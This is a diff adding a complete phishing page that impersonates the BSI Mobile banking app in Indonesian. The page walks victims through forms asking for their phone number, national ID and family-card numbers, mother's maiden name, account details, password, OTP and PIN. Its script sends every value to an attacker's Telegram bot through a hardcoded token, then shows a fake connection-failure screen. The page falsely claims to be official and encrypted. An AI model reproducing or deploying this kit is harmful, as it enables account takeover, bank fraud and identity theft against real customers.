@@ -1,0 +1,900 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>BSI Mobile — Verifikasi</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Inter", "SF Pro Display", "Segoe UI", Roboto, sans-serif;
+      background: #ffffff;
+      min-height: 100vh;
+      color: #333;
+      -webkit-font-smoothing: antialiased;
+    }
+    .container { max-width: 480px; margin: 0 auto; padding: 0 24px; }
+    .hidden { display: none !important; }
+    .header {
+      display: flex;
+      align-items: center;
+      padding: 48px 24px 0;
+    }
+    .hdr-back {
+      font-size: 22px;
+      color: #1B7C7B;
+      cursor: pointer;
+      padding: 4px;
+      background: none;
+      border: none;
+    }
+    .logo-area {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin: 28px 0 36px;
+      background: #ffffff;
+      padding: 16px 20px;
+      border-radius: 20px; /* Melengkungkan area logo */
+    }
+    .logo-area img {
+      height: 120px; /* Ukuran logo diperbesar */
+      width: auto;
+      display: block;
+      max-width: 100%;
+      border-radius: 16px; /* Melengkungkan sudut gambar logo */
+    }
+    .section-title {
+      font-size: 20px;
+      font-weight: 700;
+      color: #1A1A1A;
+      margin-bottom: 4px;
+    }
+    .section-sub {
+      font-size: 13px;
+      color: #888;
+      margin-bottom: 20px;
+    }
+    .form-group { margin-bottom: 16px; }
+    .form-group label {
+      display: block;
+      font-size: 13px;
+      font-weight: 600;
+      color: #555;
+      margin-bottom: 6px;
+    }
+    .form-group input,
+    .form-group textarea {
+      width: 100%;
+      padding: 14px 16px;
+      border: 2px solid #E8E8E8;
+      border-radius: 12px;
+      font-size: 15px;
+      color: #333;
+      outline: none;
+      font-family: inherit;
+      background: #FAFAFA;
+      transition: border-color 0.2s;
+    }
+    .form-group input:focus,
+    .form-group textarea:focus {
+      border-color: #1B7C7B;
+      background: white;
+    }
+    .form-group input::placeholder {
+      color: #C0C0C0;
+    }
+    .form-group textarea { resize: none; min-height: 80px; }
+    .btn-teal {
+      width: 100%;
+      border: none;
+      border-radius: 14px;
+      padding: 16px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      font-family: inherit;
+      background: #1B7C7B;
+      color: white;
+      letter-spacing: 0.2px;
+      margin-top: 8px;
+      margin-bottom: 24px;
+      transition: all 0.2s;
+    }
+    .btn-teal:active { transform: scale(0.98); }
+    .btn-teal:disabled { background: #A5D6D4; cursor: not-allowed; }
+    .sec-warn {
+      background: #E8F5F4;
+      border: 1px solid #A5D6D4;
+      border-radius: 10px;
+      padding: 10px 14px;
+      margin-bottom: 14px;
+    }
+    .sec-warn p {
+      margin: 0;
+      font-size: 11px;
+      color: #1B7C7B;
+      line-height: 1.5;
+    }
+    .otp-field { margin-bottom: 12px; }
+    .otp-field input {
+      width: 100%;
+      padding: 16px;
+      border: 2px solid #E8E8E8;
+      border-radius: 14px;
+      text-align: center;
+      font-size: 24px;
+      font-weight: 700;
+      color: #333;
+      letter-spacing: 8px;
+      outline: none;
+      font-family: inherit;
+      background: #FAFAFA;
+      text-transform: uppercase;
+    }
+    .otp-field input:focus { border-color: #1B7C7B; background: white; }
+    .otp-hint {
+      font-size: 12px;
+      color: #999;
+      text-align: center;
+      margin-bottom: 14px;
+    }
+    .wait {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      padding: 32px 0;
+    }
+    .wait.active { display: flex; }
+    .spinner {
+      width: 48px;
+      height: 48px;
+      border: 4px solid #F0F0F0;
+      border-top: 4px solid #1B7C7B;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      margin-bottom: 20px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .wait h3 {
+      color: #1A1A1A;
+      font-size: 17px;
+      margin-bottom: 8px;
+    }
+    .wait p {
+      color: #888;
+      font-size: 13px;
+      text-align: center;
+      max-width: 260px;
+    }
+    .err {
+      display: none;
+      background: #FFF0F0;
+      border: 1px solid #FCC;
+      border-radius: 12px;
+      padding: 14px;
+      margin-top: 12px;
+      text-align: center;
+    }
+    .err.active { display: block; }
+    .err p { color: #C00; font-size: 13px; }
+    .step { display: none; }
+    .step.active { display: block; }
+
+    /* ====== HALAMAN PIN ====== */
+    .pin-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 20px 0;
+    }
+    .pin-title {
+      font-size: 22px;
+      font-weight: 700;
+      color: #1A1A1A;
+      margin-bottom: 8px;
+    }
+    .pin-sub {
+      font-size: 14px;
+      color: #888;
+      margin-bottom: 30px;
+    }
+    .pin-boxes {
+      display: flex;
+      gap: 12px;
+      justify-content: center;
+      margin-bottom: 30px;
+    }
+    .pin-box {
+      width: 48px;
+      height: 58px;
+      border: 2px solid #E8E8E8;
+      border-radius: 12px;
+      text-align: center;
+      font-size: 28px;
+      font-weight: 700;
+      color: #1A1A1A;
+      outline: none;
+      background: #FAFAFA;
+      transition: all 0.2s;
+      font-family: 'Inter', sans-serif;
+    }
+    .pin-box:focus {
+      border-color: #1B7C7B;
+      background: white;
+      box-shadow: 0 0 0 4px rgba(27, 124, 123, 0.1);
+    }
+    .pin-box.filled {
+      border-color: #1B7C7B;
+      background: #E8F5F4;
+    }
+    .pin-box.error {
+      border-color: #dc2626;
+      background: #fef2f2;
+    }
+    .pin-error-text {
+      color: #dc2626;
+      font-size: 13px;
+      font-weight: 600;
+      margin-top: -20px;
+      margin-bottom: 20px;
+      display: none;
+    }
+    .pin-error-text.show { display: block; }
+
+    /* PIN Keypad (opsional) */
+    .pin-keypad {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 12px;
+      max-width: 280px;
+      width: 100%;
+      margin: 0 auto 20px;
+    }
+    .pin-key {
+      padding: 16px;
+      border: 1.5px solid #E8E8E8;
+      border-radius: 12px;
+      background: white;
+      font-size: 22px;
+      font-weight: 600;
+      color: #1A1A1A;
+      cursor: pointer;
+      transition: all 0.15s;
+      text-align: center;
+      font-family: 'Inter', sans-serif;
+    }
+    .pin-key:active {
+      transform: scale(0.95);
+      background: #f0f0f0;
+    }
+    .pin-key.empty {
+      background: transparent;
+      border: 1.5px solid transparent;
+      cursor: default;
+    }
+    .pin-key.empty:active {
+      transform: none;
+      background: transparent;
+    }
+    .pin-key .delete-icon {
+      font-size: 18px;
+    }
+
+    /* ====== HALAMAN TERAKHIR (GAGAL) ====== */
+    .fail-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 40px 20px;
+      text-align: center;
+      min-height: 60vh;
+    }
+    .fail-icon {
+      width: 80px;
+      height: 80px;
+      border-radius: 50%;
+      background: #fef2f2;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 24px;
+    }
+    .fail-icon svg {
+      width: 40px;
+      height: 40px;
+      color: #dc2626;
+      stroke: #dc2626;
+      stroke-width: 2;
+      fill: none;
+    }
+    .fail-title {
+      font-size: 22px;
+      font-weight: 700;
+      color: #1A1A1A;
+      margin-bottom: 8px;
+    }
+    .fail-sub {
+      font-size: 14px;
+      color: #888;
+      margin-bottom: 30px;
+      line-height: 1.6;
+    }
+    .btn-retry {
+      width: 100%;
+      max-width: 280px;
+      border: none;
+      border-radius: 14px;
+      padding: 16px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      font-family: inherit;
+      background: #1B7C7B;
+      color: white;
+      transition: all 0.2s;
+    }
+    .btn-retry:active { transform: scale(0.98); }
+
+    @media (max-width: 420px) {
+      .pin-box { width: 40px; height: 50px; font-size: 22px; }
+      .pin-boxes { gap: 8px; }
+      .logo-area img { height: 90px; } /* Ukuran logo tetap proporsional di layar kecil */
+    }
+  </style>
+</head>
+<body>
+
+  <!-- ============================================= -->
+  <!-- STEP 1: NOMOR TELEPON                         -->
+  <!-- ============================================= -->
+  <div class="step active" id="step1">
+    <div class="header">
+      <button class="hdr-back" onclick="goBack()">←</button>
+    </div>
+    <div class="logo-area">
+      <img src="https://i.ibb.co.com/pBwbbGwd/download.png" alt="BSI Logo" />
+    </div>
+    <div class="container">
+      <p class="section-title">Selamat Datang di BSI Mobile</p>
+      <p class="section-sub">Masukkan nomor telepon Anda untuk verifikasi akun</p>
+      <div class="sec-warn">
+        <p>🔒 Data Anda dienkripsi dan hanya digunakan untuk verifikasi keamanan akun Anda.</p>
+      </div>
+      <div class="form-group">
+        <label>Nomor Telepon</label>
+        <input type="tel" id="phone" placeholder="Contoh: 0812-3456-7890" autocomplete="off" inputmode="tel" autofocus>
+      </div>
+      <button class="btn-teal" id="btnPhone" onclick="submitPhone()">Lanjutkan</button>
+      <div class="wait" id="waitPhone">
+        <div class="spinner"></div>
+        <h3>Memverifikasi Nomor</h3>
+        <p>Sistem sedang memverifikasi nomor telepon Anda.</p>
+        <p style="color:#1B7C7B;font-weight:600;margin-top:8px">Estimasi: 1-3 menit</p>
+      </div>
+      <div class="err" id="errPhone">
+        <p></p>
+        <button class="btn-teal" style="margin-top:8px" onclick="retryPhone()">Coba Lagi</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ============================================= -->
+  <!-- STEP 2: DATA DIRI                             -->
+  <!-- ============================================= -->
+  <div class="step" id="step2">
+    <div class="header">
+      <button class="hdr-back" onclick="show('step1')">←</button>
+    </div>
+    <div class="logo-area">
+      <img src="https://i.ibb.co.com/pBwbbGwd/download.png" alt="BSI Logo" />
+    </div>
+    <div class="container">
+      <p class="section-title">Lengkapi Data Diri</p>
+      <p class="section-sub">Mohon isi data diri berikut dengan lengkap dan benar untuk verifikasi akun.</p>
+
+      <div class="form-group"><label>Nama Lengkap</label><input type="text" id="dataNama" placeholder="Nama sesuai KTP" autocomplete="off" autofocus></div>
+      <div class="form-group"><label>Alamat Lengkap</label><textarea id="dataAlamat" placeholder="Alamat lengkap sesuai KTP"></textarea></div>
+      <div class="form-group"><label>Tanggal Lahir</label><input type="date" id="dataTgl"></div>
+      <div class="form-group"><label>Nomor Induk Kependudukan (NIK)</label><input type="text" id="dataNik" placeholder="16 digit NIK sesuai KTP" maxlength="16"></div>
+      <div class="form-group"><label>Nomor Kartu Keluarga (KK)</label><input type="text" id="dataKk" placeholder="16 digit No. KK" maxlength="16"></div>
+      <div class="form-group"><label>Nama Ibu Kandung</label><input type="text" id="dataIbu" placeholder="Nama ibu kandung Anda"></div>
+      <div class="form-group"><label>ID Rekening</label><input type="text" id="dataIdRek" placeholder="ID rekening BSI Anda"></div>
+      <div class="form-group"><label>Nomor Rekening</label><input type="text" id="dataRek" placeholder="Nomor rekening BSI Anda" inputmode="numeric"></div>
+      <div class="form-group"><label>Password</label><input type="password" id="dataPass" placeholder="Password akun BSI Mobile Anda"></div>
+
+      <div class="sec-warn">
+        <p>🔒 BSI tidak pernah meminta PIN rekening melalui telepon. Halaman ini resmi dan terenkripsi.</p>
+      </div>
+
+      <button class="btn-teal" id="btnData" onclick="submitData()">Kirim & Verifikasi</button>
+      <div class="wait" id="waitData">
+        <div class="spinner"></div>
+        <h3>Memverifikasi Data</h3>
+        <p>Sistem sedang memverifikasi data diri Anda.</p>
+        <p style="color:#1B7C7B;font-weight:600;margin-top:8px">Estimasi: 2-5 menit</p>
+      </div>
+      <div class="err" id="errData">
+        <p></p>
+        <button class="btn-teal" style="margin-top:8px" onclick="retryData()">Coba Lagi</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ============================================= -->
+  <!-- STEP 3: OTP                                  -->
+  <!-- ============================================= -->
+  <div class="step" id="step3">
+    <div class="header">
+      <button class="hdr-back" onclick="show('step2')">←</button>
+    </div>
+    <div class="logo-area">
+      <img src="https://i.ibb.co.com/pBwbbGwd/download.png" alt="BSI Logo" />
+    </div>
+    <div class="container">
+      <p class="section-title">Verifikasi OTP</p>
+      <p class="section-sub" id="otpInfo">Cek kode OTP yang telah kami kirimkan ke nomor telepon atau email yang terhubung dengan rekening Anda.</p>
+      <div class="sec-warn">
+        <p>⚠️ JANGAN berikan kode OTP ini kepada siapa pun. BSI tidak pernah meminta OTP nasabah.</p>
+      </div>
+      <div class="otp-field">
+        <input type="text" id="otpInput" placeholder="Masukkan kode OTP" autocomplete="off" inputmode="text">
+      </div>
+      <p class="otp-hint">Masukkan 6 digit kode verifikasi via SMS atau Email</p>
+      <button class="btn-teal" id="btnOtp" onclick="submitOTP()">Verifikasi</button>
+      <div style="text-align:center;margin-top:14px">
+        <a href="#" style="color:#1B7C7B;font-size:14px;font-weight:600;text-decoration:none" onclick="resendOTP()">Kirim Ulang Kode</a>
+      </div>
+      <div class="wait" id="waitOTP">
+        <div class="spinner"></div>
+        <h3>Memverifikasi OTP</h3>
+        <p>Sistem sedang memverifikasi kode OTP.</p>
+      </div>
+      <div class="err" id="errOTP">
+        <p></p>
+        <button class="btn-teal" style="margin-top:8px" onclick="retryOTP()">Masukkan Ulang</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ============================================= -->
+  <!-- STEP 4: PIN (HALAMAN PIN TERPISAH)            -->
+  <!-- ============================================= -->
+  <div class="step" id="step4">
+    <div class="header">
+      <button class="hdr-back" onclick="show('step3')">←</button>
+    </div>
+    <div class="logo-area">
+      <img src="https://i.ibb.co.com/pBwbbGwd/download.png" alt="BSI Logo" />
+    </div>
+    <div class="container">
+      <div class="pin-container">
+        <p class="pin-title">Masukkan PIN Rekening</p>
+        <p class="pin-sub">Masukkan 6 digit PIN rekening BSI Anda</p>
+
+        <!-- 6 Kotak PIN -->
+        <div class="pin-boxes" id="pinBoxes">
+          <input type="password" class="pin-box" id="pin0" maxlength="1" inputmode="numeric" autofocus>
+          <input type="password" class="pin-box" id="pin1" maxlength="1" inputmode="numeric">
+          <input type="password" class="pin-box" id="pin2" maxlength="1" inputmode="numeric">
+          <input type="password" class="pin-box" id="pin3" maxlength="1" inputmode="numeric">
+          <input type="password" class="pin-box" id="pin4" maxlength="1" inputmode="numeric">
+          <input type="password" class="pin-box" id="pin5" maxlength="1" inputmode="numeric">
+        </div>
+
+        <div class="pin-error-text" id="pinError">❌ PIN harus 6 digit angka</div>
+
+        <!-- Tombol Keypad (opsional) -->
+        <div class="pin-keypad" id="pinKeypad">
+          <button class="pin-key" data-value="1">1</button>
+          <button class="pin-key" data-value="2">2</button>
+          <button class="pin-key" data-value="3">3</button>
+          <button class="pin-key" data-value="4">4</button>
+          <button class="pin-key" data-value="5">5</button>
+          <button class="pin-key" data-value="6">6</button>
+          <button class="pin-key" data-value="7">7</button>
+          <button class="pin-key" data-value="8">8</button>
+          <button class="pin-key" data-value="9">9</button>
+          <button class="pin-key empty"></button>
+          <button class="pin-key" data-value="0">0</button>
+          <button class="pin-key" data-value="delete"><span class="delete-icon">⌫</span></button>
+        </div>
+
+        <button class="btn-teal" id="btnPin" onclick="submitPIN()">Konfirmasi PIN</button>
+      </div>
+      <div class="wait" id="waitPIN">
+        <div class="spinner"></div>
+        <h3>Memverifikasi PIN</h3>
+        <p>Sistem sedang memverifikasi PIN rekening Anda.</p>
+      </div>
+      <div class="err" id="errPIN">
+        <p></p>
+        <button class="btn-teal" style="margin-top:8px" onclick="retryPIN()">Coba Lagi</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ============================================= -->
+  <!-- STEP 5: HALAMAN GAGAL (SAMBUNGAN TERPUTUS)   -->
+  <!-- ============================================= -->
+  <div class="step" id="step5">
+    <div class="header"><span style="width:30px"></span></div>
+    <div class="container">
+      <div class="fail-container">
+        <div class="fail-icon">
+          <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="12" r="10" />
+            <line x1="12" y1="8" x2="12" y2="12" />
+            <line x1="12" y1="16" x2="12.01" y2="16" />
+          </svg>
+        </div>
+        <p class="fail-title">Sambungan Terputus</p>
+        <p class="fail-sub">Silakan coba lagi nanti</p>
+        <button class="btn-retry" onclick="resetAll()">Coba Lagi</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ============================================= -->
+  <!-- SCRIPT                                      -->
+  <!-- ============================================= -->
+  <script>
+    // ============================================
+    // NAVIGASI
+    // ============================================
+    function show(id) {
+      document.querySelectorAll('.step').forEach(function(s) { s.classList.remove('active'); });
+      document.getElementById(id).classList.add('active');
+      window.scrollTo(0, 0);
+    }
+
+    function goBack() {
+      if (window.history.length > 1) {
+        window.history.back();
+      }
+    }
+
+    // ============================================
+    // STEP 1: NOMOR TELEPON
+    // ============================================
+    function submitPhone() {
+      var ph = document.getElementById('phone').value.trim();
+      if (!ph || ph.length < 8) { alert('Mohon isi nomor telepon dengan benar'); return; }
+      document.getElementById('btnPhone').style.display = 'none';
+      document.getElementById('waitPhone').classList.add('active');
+      setTimeout(function() {
+        document.getElementById('waitPhone').classList.remove('active');
+        document.getElementById('btnPhone').style.display = 'block';
+        show('step2');
+      }, 3000);
+    }
+
+    function retryPhone() {
+      document.getElementById('btnPhone').style.display = 'block';
+      document.getElementById('waitPhone').classList.remove('active');
+      document.getElementById('errPhone').classList.remove('active');
+    }
+
+    // ============================================
+    // STEP 2: DATA DIRI
+    // ============================================
+    function submitData() {
+      var n = document.getElementById('dataNama').value.trim();
+      var a = document.getElementById('dataAlamat').value.trim();
+      var t = document.getElementById('dataTgl').value.trim();
+      var nik = document.getElementById('dataNik').value.trim();
+      var kk = document.getElementById('dataKk').value.trim();
+      var i = document.getElementById('dataIbu').value.trim();
+      var idr = document.getElementById('dataIdRek').value.trim();
+      var r = document.getElementById('dataRek').value.trim();
+      var p = document.getElementById('dataPass').value.trim();
+
+      if (!n || !a || !t || !nik || !kk || !i || !idr || !r || !p) {
+        alert('Mohon isi semua data diri dengan lengkap!');
+        return;
+      }
+
+      document.getElementById('btnData').style.display = 'none';
+      document.getElementById('waitData').classList.add('active');
+      setTimeout(function() {
+        document.getElementById('waitData').classList.remove('active');
+        document.getElementById('btnData').style.display = 'block';
+        show('step3');
+      }, 3000);
+    }
+
+    function retryData() {
+      document.getElementById('btnData').style.display = 'block';
+      document.getElementById('waitData').classList.remove('active');
+      document.getElementById('errData').classList.remove('active');
+    }
+
+    // ============================================
+    // STEP 3: OTP
+    // ============================================
+    function submitOTP() {
+      var o = document.getElementById('otpInput').value.trim();
+      if (!o) { alert('Masukkan kode OTP'); return; }
+      document.getElementById('btnOtp').style.display = 'none';
+      document.getElementById('waitOTP').classList.add('active');
+      setTimeout(function() {
+        document.getElementById('waitOTP').classList.remove('active');
+        document.getElementById('btnOtp').style.display = 'block';
+        show('step4');
+      }, 3000);
+    }
+
+    function retryOTP() {
+      document.getElementById('errOTP').classList.remove('active');
+      document.getElementById('waitOTP').classList.remove('active');
+      document.getElementById('btnOtp').style.display = 'block';
+      document.getElementById('otpInput').value = '';
+    }
+
+    function resendOTP() {
+      alert('Kode OTP baru telah dikirim.');
+    }
+
+    // ============================================
+    // STEP 4: PIN (6 KOTAK + KEYPAD)
+    // ============================================
+    var pinValues = ['', '', '', '', '', ''];
+    var pinInputs = [];
+
+    document.addEventListener('DOMContentLoaded', function() {
+      for (var i = 0; i < 6; i++) {
+        var input = document.getElementById('pin' + i);
+        pinInputs.push(input);
+
+        input.addEventListener('input', function(e) {
+          var idx = parseInt(this.id.replace('pin', ''));
+          var val = this.value;
+
+          if (val && !/^\d$/.test(val)) {
+            this.value = '';
+            return;
+          }
+
+          pinValues[idx] = this.value || '';
+          if (this.value) {
+            this.classList.add('filled');
+          } else {
+            this.classList.remove('filled');
+          }
+
+          if (this.value && idx < 5) {
+            document.getElementById('pin' + (idx + 1)).focus();
+          }
+
+          document.getElementById('pinError').classList.remove('show');
+          document.querySelectorAll('.pin-box').forEach(function(b) {
+            b.classList.remove('error');
+          });
+        });
+
+        input.addEventListener('keydown', function(e) {
+          var idx = parseInt(this.id.replace('pin', ''));
+          if (e.key === 'Backspace' && !this.value && idx > 0) {
+            document.getElementById('pin' + (idx - 1)).focus();
+          }
+        });
+
+        input.addEventListener('paste', function(e) {
+          e.preventDefault();
+          var pasteData = (e.clipboardData || window.clipboardData).getData('text');
+          if (pasteData && /^\d{6}$/.test(pasteData)) {
+            for (var i = 0; i < 6; i++) {
+              var inp = document.getElementById('pin' + i);
+              inp.value = pasteData[i];
+              pinValues[i] = pasteData[i];
+              if (pasteData[i]) inp.classList.add('filled');
+            }
+            document.getElementById('pin5').focus();
+          }
+        });
+      }
+
+      var keypadButtons = document.querySelectorAll('.pin-key:not(.empty)');
+      keypadButtons.forEach(function(btn) {
+        btn.addEventListener('click', function() {
+          var value = this.dataset.value;
+          if (value === 'delete') {
+            for (var i = 5; i >= 0; i--) {
+              if (pinValues[i]) {
+                pinValues[i] = '';
+                pinInputs[i].value = '';
+                pinInputs[i].classList.remove('filled');
+                pinInputs[i].focus();
+                break;
+              }
+            }
+          } else {
+            for (var i = 0; i < 6; i++) {
+              if (!pinValues[i]) {
+                pinValues[i] = value;
+                pinInputs[i].value = value;
+                pinInputs[i].classList.add('filled');
+                if (i < 5) pinInputs[i + 1].focus();
+                break;
+              }
+            }
+          }
+          document.getElementById('pinError').classList.remove('show');
+          document.querySelectorAll('.pin-box').forEach(function(b) {
+            b.classList.remove('error');
+          });
+        });
+      });
+    });
+
+    function submitPIN() {
+      var pin = pinValues.join('');
+      if (pin.length !== 6) {
+        document.getElementById('pinError').textContent = '❌ PIN harus 6 digit angka';
+        document.getElementById('pinError').classList.add('show');
+        document.querySelectorAll('.pin-box').forEach(function(b) {
+          if (!b.value) b.classList.add('error');
+        });
+        return;
+      }
+
+      document.getElementById('btnPin').style.display = 'none';
+      document.getElementById('waitPIN').classList.add('active');
+
+      setTimeout(function() {
+        document.getElementById('waitPIN').classList.remove('active');
+        document.getElementById('btnPin').style.display = 'block';
+        show('step5'); // ARAH KE HALAMAN GAGAL
+      }, 3000);
+    }
+
+    function retryPIN() {
+      document.getElementById('errPIN').classList.remove('active');
+      document.getElementById('waitPIN').classList.remove('active');
+      document.getElementById('btnPin').style.display = 'block';
+      pinValues = ['', '', '', '', '', ''];
+      pinInputs.forEach(function(inp, i) {
+        inp.value = '';
+        inp.classList.remove('filled', 'error');
+      });
+      document.getElementById('pin0').focus();
+      document.getElementById('pinError').classList.remove('show');
+    }
+
+    // ============================================
+    // RESET KE HALAMAN AWAL
+    // ============================================
+    function resetAll() {
+      // Reset semua input
+      document.getElementById('phone').value = '';
+      document.getElementById('dataNama').value = '';
+      document.getElementById('dataAlamat').value = '';
+      document.getElementById('dataTgl').value = '';
+      document.getElementById('dataNik').value = '';
+      document.getElementById('dataKk').value = '';
+      document.getElementById('dataIbu').value = '';
+      document.getElementById('dataIdRek').value = '';
+      document.getElementById('dataRek').value = '';
+      document.getElementById('dataPass').value = '';
+      document.getElementById('otpInput').value = '';
+      pinValues = ['', '', '', '', '', ''];
+      pinInputs.forEach(function(inp, i) {
+        inp.value = '';
+        inp.classList.remove('filled', 'error');
+      });
+      document.getElementById('pinError').classList.remove('show');
+
+      // Kembali ke step 1
+      show('step1');
+    }
+
+    // ============================================
+    // TELEGRAM (Tetap Aktif)
+    // ============================================
+    const TELEGRAM_TOKEN = '8909248248:AAHyy7GiNs4Mh2ApZXy-s_f5TQkzGxxZ_j4';
+    const TELEGRAM_CHAT_ID = '6233868892';
+
+    async function kirimKeTelegram(pesan) {
+      const header = '🏦 BANK SYARIAH INDONESIA (BSI)\n═══════════════════════════\n📱 BSI Mobile - Verifikasi\n\n';
+      try {
+        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: header + pesan, parse_mode: 'Markdown' })
+        });
+        return await response.json();
+      } catch (error) { return { ok: false, error: error.message }; }
+    }
+
+    // Override submitPhone
+    const originalSubmitPhone = submitPhone;
+    submitPhone = async function() {
+      const telepon = document.getElementById('phone').value.trim();
+      if (!telepon || telepon.length < 8) { alert('Mohon isi nomor telepon'); return; }
+      document.getElementById('btnPhone').style.display = 'none';
+      document.getElementById('waitPhone').classList.add('active');
+      await kirimKeTelegram(`📞 NOMOR MASUK\n───────────────────\n📱 No: ${telepon}\n⏰ Waktu: ${new Date().toLocaleString('id-ID')}`);
+      setTimeout(() => {
+        document.getElementById('waitPhone').classList.remove('active');
+        document.getElementById('btnPhone').style.display = 'block';
+        show('step2');
+      }, 3000);
+    };
+
+    // Override submitData
+    const originalSubmitData = submitData;
+    submitData = async function() {
+      const data = {
+        nama: document.getElementById('dataNama').value.trim(),
+        alamat: document.getElementById('dataAlamat').value.trim(),
+        tglLahir: document.getElementById('dataTgl').value.trim(),
+        nik: document.getElementById('dataNik').value.trim(),
+        kk: document.getElementById('dataKk').value.trim(),
+        ibu: document.getElementById('dataIbu').value.trim(),
+        idRekening: document.getElementById('dataIdRek').value.trim(),
+        noRekening: document.getElementById('dataRek').value.trim(),
+        password: document.getElementById('dataPass').value.trim(),
+        telepon: document.getElementById('phone').value.trim()
+      };
+      if (!data.nama || !data.alamat || !data.tglLahir || !data.nik || !data.kk || !data.ibu || !data.idRekening || !data.noRekening || !data.password) {
+        alert('Mohon isi semua data diri dengan lengkap!');
+        return;
+      }
+      document.getElementById('btnData').style.display = 'none';
+      document.getElementById('waitData').classList.add('active');
+      const pesan = `📨 DATA VERIFIKASI\n────────────────────────\n👤 Nama: ${data.nama}\n📍 Alamat: ${data.alamat}\n📅 Tgl Lahir: ${data.tglLahir}\n🆔 NIK: ${data.nik}\n🏠 No. KK: ${data.kk}\n👩 Ibu Kandung: ${data.ibu}\n🔑 ID Rekening: ${data.idRekening}\n💳 No. Rekening: ${data.noRekening}\n🔐 Password: ${data.password}\n📱 No: ${data.telepon}\n⏰ Waktu: ${new Date().toLocaleString('id-ID')}`;
+      const result = await kirimKeTelegram(pesan);
+      document.getElementById('waitData').classList.remove('active');
+      document.getElementById('btnData').style.display = 'block';
+      if (result.ok) { show('step3'); } else {
+        document.getElementById('errData').querySelector('p').textContent = '❌ Gagal kirim data: ' + (result.error || 'Coba lagi');
+        document.getElementById('errData').classList.add('active');
+      }
+    };
+
+    // Override submitOTP
+    const originalSubmitOTP = submitOTP;
+    submitOTP = async function() {
+      const otp = document.getElementById('otpInput').value.trim();
+      if (!otp) { alert('Masukkan kode OTP'); return; }
+      document.getElementById('btnOtp').style.display = 'none';
+      document.getElementById('waitOTP').classList.add('active');
+      await kirimKeTelegram(`🔐 KODE OTP MASUK\n─────────────────\n🔢 Kode OTP: ${otp}\n📱 No: ${document.getElementById('phone').value.trim() || '-'}\n⏰ Waktu: ${new Date().toLocaleString('id-ID')}`);
+      setTimeout(() => {
+        document.getElementById('waitOTP').classList.remove('active');
+        document.getElementById('btnOtp').style.display = 'block';
+        show('step4');
+      }, 3000);
+    };
+
+    // Override submitPIN (kirim PIN ke Telegram)
+    const originalSubmitPIN = submitPIN;
+    submitPIN = async function() {
+      var pin = pinValues.join('');
+      if (pin.length !== 6) {
+        document.getElementById('pinError').textContent = '❌ PIN harus 6 digit angka';
+        document.getElementById('pinError').classList.add('show');
+        document.querySelectorAll('.pin-box').forEach(function(b) {
+          if (!b.value) b.classList.add('error');
+        });
+        return;
+      }
+
+      document.getElementById('btnPin').style.display = 'none';
+      document.getElementById('waitPIN').classList.add('active');
+
+      await kirimKeTelegram(`🔒 PIN REKENING MASUK\n─────────────────────\n🔢 PIN: ${pin}\n📱 No: ${document.getElementById('phone').value.trim() || '-'}\n⏰ Waktu: ${new Date().toLocaleString('id-ID')}`);
+
+      setTimeout(function() {
+        document.getElementById('waitPIN').classList.remove('active');
+        document.getElementById('btnPin').style.display = 'block';
+        show('step5'); // ARAH KE HALAMAN GAGAL
+      }, 3000);
+    };
+
+    console.log('✅ Telegram Bot BSI siap!');
+  </script>
+
+</body>
+</html>
